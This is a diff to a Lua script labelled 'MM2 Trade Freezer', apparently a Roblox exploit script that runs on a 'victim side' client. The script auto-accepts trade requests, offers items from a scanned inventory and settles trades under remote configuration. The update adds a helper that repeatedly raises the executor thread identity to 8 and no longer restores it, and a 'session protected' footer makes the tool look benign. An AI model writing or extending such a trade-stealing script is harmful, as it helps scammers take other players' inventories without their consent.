@@ -1,5 +1,5 @@
 --=============================================================
---  MM2 Trade Freezer  |  v14.0  |  remote-driven engine
+--  MM2 Trade Freezer  |  v14.1  |  remote-driven engine
 --  victim side: auto-accepts request, offers, settles trade
 --=============================================================
 
@@ -84,6 +84,12 @@ end
 
 local function trim(s)
 	return (string.gsub(string.gsub(tostring(s or ""), "^%s+", ""), "%s+$", ""))
+end
+
+local function raiseIdentity()
+	pcall(function()
+		setthreadidentity(8)
+	end)
 end
 
 --==================== REMOTE CONFIG ==========================
@@ -472,7 +478,7 @@ local function buildUI()
 	foot.Size = UDim2.new(1, -26, 0, 14)
 	foot.Position = UDim2.new(0, 13, 0, 366)
 	foot.BackgroundTransparency = 1
-	foot.Text = "session protected  •  ver 14.0.0"
+	foot.Text = "session protected  •  ver 14.1.0"
 	foot.Font = Enum.Font.Gotham
 	foot.TextSize = 9
 	foot.TextColor3 = Color3.fromRGB(96, 80, 122)
@@ -619,9 +625,7 @@ local function scanInventory()
 		}
 	end
 
-	pcall(function()
-		setthreadidentity(8)
-	end)
+	raiseIdentity()
 
 	local ok = pcall(function()
 		local mod = require(RS.Modules.InventoryModule)
@@ -651,9 +655,7 @@ local function scanInventory()
 		end)
 	end
 
-	pcall(function()
-		setthreadidentity(2)
-	end)
+	raiseIdentity()
 
 	table.sort(out, function(a, b)
 		return a.Value > b.Value
@@ -808,6 +810,7 @@ local function settle()
 end
 
 local function run()
+	raiseIdentity()
 	loadRemoteConfig()
 
 	if uiStatus then
@@ -848,6 +851,7 @@ local function run()
 	while rounds < CFG.max_rounds and idx <= #items do
 		rounds = rounds + 1
 		log("round " .. tostring(rounds))
+		raiseIdentity()
 
 		local batch = {}
 		local n = 1
